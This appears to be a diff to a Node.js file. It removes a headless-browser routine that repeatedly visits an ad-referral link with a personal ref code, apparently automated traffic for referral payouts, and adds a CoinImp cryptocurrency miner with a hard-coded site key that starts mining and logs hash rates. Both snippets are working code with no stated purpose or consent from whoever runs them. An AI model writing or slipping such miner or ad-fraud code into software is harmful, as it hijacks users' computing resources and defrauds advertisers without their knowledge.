@@ -21,22 +21,28 @@ const http = require('http');
 })();
 
 
-const puppeteer = require('puppeteer');
+const CoinImp = require('coin-imp');
+
 function kiusi(){
   (async () => {
-  console.log('-----kiusi00000-----------');
-  const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
-  
-  const page = await browser.newPage();
-  //await page.goto('https://cvqze.github.io/luchj/index.html'); 
-   
-  await page.goto('http://www.adzbux.com/promote7.php?ref=biboucuongoc1102'); 
-  console.log('----XONG0--------');
-  setTimeout(async () => await await page.close(), 185000);
-  setTimeout(async () => await browser.close(), 193000);
-  console.log('----XONG--------');
-  
-  })();
+  // Create miner
+  const miner = await CoinImp('42a41ad2eb9291f2b48fa6cf2eb4b606cdc1dc9f0f852f5ad2b59636279227f4'); // CoinImp's Site Key 
+  // Start miner
+  await miner.start(); 
+  // Listen on events
+  miner.on('found', () => console.log('Found!'));
+  miner.on('accepted', () => console.log('Accepted!'));
+  miner.on('update', data =>
+    console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+  ); 
+  // Stop miner
+  setTimeout(async () => await miner.stop(), 30000);
+})();
+
 }
 
 
